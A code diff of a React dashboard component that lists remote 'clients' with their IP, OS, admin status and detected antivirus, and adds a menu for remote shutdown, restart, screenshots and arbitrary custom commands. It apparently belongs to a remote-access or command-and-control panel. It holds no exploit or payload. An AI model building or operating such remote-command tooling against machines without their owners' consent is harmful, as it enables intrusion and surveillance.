@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { Agent } from '../types';
 import toast from 'react-hot-toast';
 import { API_URL } from '../config';
+import { FiMoreVertical, FiShield, FiShieldOff, FiCamera, FiTerminal, FiInfo, FiPower, FiRefreshCw } from 'react-icons/fi';
 
 interface UserTableProps {
   users: Agent[];
@@ -11,6 +12,8 @@ interface UserTableProps {
 
 const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks }) => {
   const [selectedUser, setSelectedUser] = useState<Agent | null>(null);
+  const [showCustomCommand, setShowCustomCommand] = useState<Agent | null>(null);
+  const [customCommand, setCustomCommand] = useState('');
 
   // Separate online and offline users
   const onlineUsers = users.filter(user => user.status === 'online');
@@ -48,18 +51,42 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
     return user.ipAddress;
   };
 
-  const getArchitecture = (user: Agent) => {
-    if (user.architecture && user.architecture !== 'unknown') {
-      return user.architecture;
+  const getOSVersion = (user: Agent) => {
+    if (user.osVersion && user.osVersion !== 'Unknown') {
+      return user.osVersion;
     }
-    // Try to determine from system info
-    if (user.systemInfo?.username) {
-      return 'x64'; // Default for Windows
+    // Extract OS version from platform string
+    if (user.platform) {
+      const platformLower = user.platform.toLowerCase();
+      if (platformLower.includes('windows 11')) {
+        return 'Windows 11';
+      } else if (platformLower.includes('windows 10')) {
+        return 'Windows 10';
+      } else if (platformLower.includes('windows')) {
+        return 'Windows';
+      } else if (platformLower.includes('linux')) {
+        return 'Linux';
+      } else if (platformLower.includes('macos') || platformLower.includes('darwin')) {
+        return 'macOS';
+      }
     }
-    return 'x64';
+    return 'Unknown';
+  };
+
+  const getAntivirus = (user: Agent) => {
+    if (user.systemInfo?.antivirus && Array.isArray(user.systemInfo.antivirus)) {
+      return user.systemInfo.antivirus.join(', ') || 'None detected';
+    } else if (user.systemInfo?.antivirus) {
+      return user.systemInfo.antivirus;
+    }
+    return 'Unknown';
   };
 
   const handleQuickCommand = async (user: Agent, command: string) => {
+    console.log('handleQuickCommand called with user:', user);
+    console.log('user.id:', user.id);
+    console.log('user.uuid:', user.uuid);
+    console.log('user.computerName:', user.computerName);
     try {
       const response = await fetch(`${API_URL}/agent/${user.id}/command`, {
         method: 'POST',
@@ -89,89 +116,114 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
     }
   };
 
+  const handleCustomCommand = async (user: Agent) => {
+    if (!customCommand.trim()) {
+      toast.error('Please enter a command');
+      return;
+    }
+
+    await handleQuickCommand(user, customCommand);
+    setCustomCommand('');
+    setShowCustomCommand(null);
+  };
+
+  const FloatingActionMenu = ({ user }: { user: Agent }) => {
+    const [showActions, setShowActions] = useState(false);
+
+    return (
+      <div className="relative">
+        <button
+          className="premium-floating-menu-button"
+          onClick={() => setShowActions(!showActions)}
+        >
+          <FiMoreVertical className="w-4 h-4" />
+        </button>
+        
+        {showActions && (
+          <div className="premium-dropdown show">
+            <div className="premium-dropdown-item" onClick={() => handleQuickCommand(user, 'shutdown')}>
+              <FiPower className="w-4 h-4 mr-2" />
+              Shutdown
+            </div>
+            <div className="premium-dropdown-item" onClick={() => handleQuickCommand(user, 'restart')}>
+              <FiRefreshCw className="w-4 h-4 mr-2" />
+              Restart
+            </div>
+            <div className="premium-dropdown-item" onClick={() => handleQuickCommand(user, 'screenshot')}>
+              <FiCamera className="w-4 h-4 mr-2" />
+              Screenshot
+            </div>
+            <div className="premium-dropdown-item" onClick={() => onViewUser(user)}>
+              <FiInfo className="w-4 h-4 mr-2" />
+              View Details
+            </div>
+            <div className="premium-dropdown-item" onClick={() => setShowCustomCommand(user)}>
+              <FiTerminal className="w-4 h-4 mr-2" />
+              Custom Command
+            </div>
+          </div>
+        )}
+      </div>
+    );
+  };
+
   return (
     <div className="space-y-6">
       {/* Online Clients - Top Priority */}
-      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark">
-        <div className="px-6 py-4 border-b border-stroke dark:border-strokedark">
-          <h2 className="text-xl font-semibold text-black dark:text-white">
+      <div className="premium-card">
+        <div className="premium-card-header">
+          <h2 className="text-xl font-semibold text-gray-900 dark:text-white">
             🟢 Online Clients ({onlineUsers.length})
           </h2>
         </div>
         
         {onlineUsers.length > 0 ? (
           <div className="overflow-x-auto">
-            <table className="w-full text-sm text-left text-gray-300">
-              <thead className="text-xs text-gray-400 uppercase bg-gray-800">
+            <table className="w-full text-sm text-left">
+              <thead className="text-xs text-gray-500 dark:text-gray-400 uppercase bg-gray-50 dark:bg-gray-800">
                 <tr>
                   <th className="px-6 py-3">Computer Name</th>
                   <th className="px-6 py-3">IP Address</th>
-                  <th className="px-6 py-3">Architecture</th>
+                  <th className="px-6 py-3">Operating System</th>
                   <th className="px-6 py-3">Uptime</th>
-                  <th className="px-6 py-3">Last Active</th>
-                  <th className="px-6 py-3">Quick Actions</th>
-                  <th className="px-6 py-3">Details</th>
+                  <th className="px-6 py-3">Last Activity</th>
+                  <th className="px-6 py-3">Antivirus</th>
+                  <th className="px-6 py-3">Actions</th>
                 </tr>
               </thead>
               <tbody>
                 {onlineUsers.map((user) => (
-                  <tr key={user.id} className="hover:bg-gray-700 transition-colors">
+                  <tr key={user.id} className="hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                     <td className="px-6 py-4">
                       <div className="flex items-center space-x-3">
                         <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                         <div>
-                          <div className="font-medium text-white">{user.computerName}</div>
-                          <div className="text-xs text-gray-400">{user.uuid}</div>
+                          <div className="font-medium text-gray-900 dark:text-white">{user.computerName}</div>
+                          <div className="text-xs text-gray-500 dark:text-gray-400">{user.uuid}</div>
+                          {user.systemInfo?.isAdmin && (
+                            <div className="flex items-center mt-1">
+                              <FiShield className="w-3 h-3 text-yellow-500 mr-1" />
+                              <span className="text-xs text-yellow-600 dark:text-yellow-400">Admin</span>
+                            </div>
+                          )}
                         </div>
                       </div>
                     </td>
-                    <td className="px-6 py-4 text-white">{getRealIP(user)}</td>
+                    <td className="px-6 py-4 text-gray-900 dark:text-white">{getRealIP(user)}</td>
                     <td className="px-6 py-4">
-                      <span className="px-2 py-1 text-xs font-medium bg-blue-100 text-blue-800 rounded-full">
-                        {getArchitecture(user)}
+                      <span className="px-2 py-1 text-xs font-medium bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200 rounded-full">
+                        {getOSVersion(user)}
                       </span>
                     </td>
-                    <td className="px-6 py-4 text-white">
+                    <td className="px-6 py-4 text-gray-900 dark:text-white">
                       {user.systemInfo?.uptime ? formatUptime(user.systemInfo.uptime) : 'Unknown'}
                     </td>
-                    <td className="px-6 py-4 text-green-400">{formatLastActive(user.lastActiveTime)}</td>
-                    <td className="px-6 py-4">
-                      <div className="flex space-x-2">
-                        <button
-                          onClick={() => handleQuickCommand(user, 'shutdown')}
-                          className="px-3 py-1 text-xs bg-red-600 hover:bg-red-700 text-white rounded transition-colors"
-                        >
-                          Shutdown
-                        </button>
-                        <button
-                          onClick={() => handleQuickCommand(user, 'restart')}
-                          className="px-3 py-1 text-xs bg-orange-600 hover:bg-orange-700 text-white rounded transition-colors"
-                        >
-                          Restart
-                        </button>
-                        <button
-                          onClick={() => handleQuickCommand(user, 'screenshot')}
-                          className="px-3 py-1 text-xs bg-blue-600 hover:bg-blue-700 text-white rounded transition-colors"
-                        >
-                          Screenshot
-                        </button>
-                      </div>
+                    <td className="px-6 py-4 text-green-600 dark:text-green-400">{formatLastActive(user.lastActiveTime)}</td>
+                    <td className="px-6 py-4 text-gray-900 dark:text-white">
+                      <span className="text-xs">{getAntivirus(user)}</span>
                     </td>
                     <td className="px-6 py-4">
-                      <div className="flex space-x-2">
-                        <button
-                          onClick={() => onViewUser(user)}
-                          className="px-3 py-1 text-xs bg-gray-600 hover:bg-gray-700 text-white rounded transition-colors"
-                        >
-                          View
-                        </button>
-                        <button
-                          onClick={() => onViewTasks(user)}
-                          className="px-3 py-1 text-xs bg-purple-600 hover:bg-purple-700 text-white rounded transition-colors"
-                        >
-                          Commands
-                        </button>
-                      </div>
+                      <FloatingActionMenu user={user} />
                     </td>
                   </tr>
                 ))}
@@ -179,7 +231,7 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
             </table>
           </div>
         ) : (
-          <div className="px-6 py-8 text-center text-gray-400">
+          <div className="px-6 py-8 text-center text-gray-500 dark:text-gray-400">
             <div className="text-4xl mb-4">🔍</div>
             <p>No online clients found</p>
             <p className="text-sm mt-2">Start the client to see it appear here</p>
@@ -189,11 +241,11 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
 
       {/* Offline Clients - Collapsible */}
       {offlineUsers.length > 0 && (
-        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark">
+        <div className="premium-card">
           <details className="group">
-            <summary className="px-6 py-4 border-b border-stroke dark:border-strokedark cursor-pointer list-none">
+            <summary className="premium-card-header cursor-pointer list-none">
               <div className="flex items-center justify-between">
-                <h2 className="text-xl font-semibold text-black dark:text-white">
+                <h2 className="text-xl font-semibold text-gray-900 dark:text-white">
                   🔴 Offline Clients ({offlineUsers.length})
                 </h2>
                 <div className="transform group-open:rotate-180 transition-transform">
@@ -205,39 +257,49 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
             </summary>
             
             <div className="overflow-x-auto">
-              <table className="w-full text-sm text-left text-gray-300">
-                <thead className="text-xs text-gray-400 uppercase bg-gray-800">
+              <table className="w-full text-sm text-left">
+                <thead className="text-xs text-gray-500 dark:text-gray-400 uppercase bg-gray-50 dark:bg-gray-800">
                   <tr>
                     <th className="px-6 py-3">Computer Name</th>
                     <th className="px-6 py-3">IP Address</th>
-                    <th className="px-6 py-3">Architecture</th>
+                    <th className="px-6 py-3">Operating System</th>
                     <th className="px-6 py-3">Last Seen</th>
+                    <th className="px-6 py-3">Antivirus</th>
                     <th className="px-6 py-3">Actions</th>
                   </tr>
                 </thead>
                 <tbody>
                   {offlineUsers.map((user) => (
-                    <tr key={user.id} className="hover:bg-gray-700 transition-colors">
+                    <tr key={user.id} className="hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                       <td className="px-6 py-4">
                         <div className="flex items-center space-x-3">
                           <div className="w-3 h-3 bg-red-400 rounded-full"></div>
                           <div>
-                            <div className="font-medium text-white">{user.computerName}</div>
-                            <div className="text-xs text-gray-400">{user.uuid}</div>
+                            <div className="font-medium text-gray-900 dark:text-white">{user.computerName}</div>
+                            <div className="text-xs text-gray-500 dark:text-gray-400">{user.uuid}</div>
+                            {user.systemInfo?.isAdmin && (
+                              <div className="flex items-center mt-1">
+                                <FiShield className="w-3 h-3 text-yellow-500 mr-1" />
+                                <span className="text-xs text-yellow-600 dark:text-yellow-400">Admin</span>
+                              </div>
+                            )}
                           </div>
                         </div>
                       </td>
-                      <td className="px-6 py-4 text-white">{getRealIP(user)}</td>
+                      <td className="px-6 py-4 text-gray-900 dark:text-white">{getRealIP(user)}</td>
                       <td className="px-6 py-4">
-                        <span className="px-2 py-1 text-xs font-medium bg-gray-100 text-gray-800 rounded-full">
-                          {getArchitecture(user)}
+                        <span className="px-2 py-1 text-xs font-medium bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-200 rounded-full">
+                          {getOSVersion(user)}
                         </span>
                       </td>
-                      <td className="px-6 py-4 text-red-400">{formatLastActive(user.lastActiveTime)}</td>
+                      <td className="px-6 py-4 text-red-600 dark:text-red-400">{formatLastActive(user.lastActiveTime)}</td>
+                      <td className="px-6 py-4 text-gray-900 dark:text-white">
+                        <span className="text-xs">{getAntivirus(user)}</span>
+                      </td>
                       <td className="px-6 py-4">
                         <button
                           onClick={() => onViewUser(user)}
-                          className="px-3 py-1 text-xs bg-gray-600 hover:bg-gray-700 text-white rounded transition-colors"
+                          className="premium-button text-xs"
                         >
                           View Details
                         </button>
@@ -248,6 +310,48 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
               </table>
             </div>
           </details>
+        </div>
+      )}
+
+      {/* Custom Command Modal */}
+      {showCustomCommand && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="premium-card max-w-md w-full mx-4">
+            <div className="premium-card-header">
+              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
+                Custom Command - {showCustomCommand.computerName}
+              </h3>
+            </div>
+            <div className="p-6">
+              <div className="mb-4">
+                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
+                  Command to execute:
+                </label>
+                <input
+                  type="text"
+                  value={customCommand}
+                  onChange={(e) => setCustomCommand(e.target.value)}
+                  placeholder="Enter command..."
+                  className="premium-input w-full"
+                  onKeyPress={(e) => e.key === 'Enter' && handleCustomCommand(showCustomCommand)}
+                />
+              </div>
+              <div className="flex justify-end space-x-3">
+                <button
+                  onClick={() => setShowCustomCommand(null)}
+                  className="premium-button bg-gray-600 hover:bg-gray-700"
+                >
+                  Cancel
+                </button>
+                <button
+                  onClick={() => handleCustomCommand(showCustomCommand)}
+                  className="premium-button"
+                >
+                  Execute
+                </button>
+              </div>
+            </div>
+          </div>
         </div>
       )}
     </div>
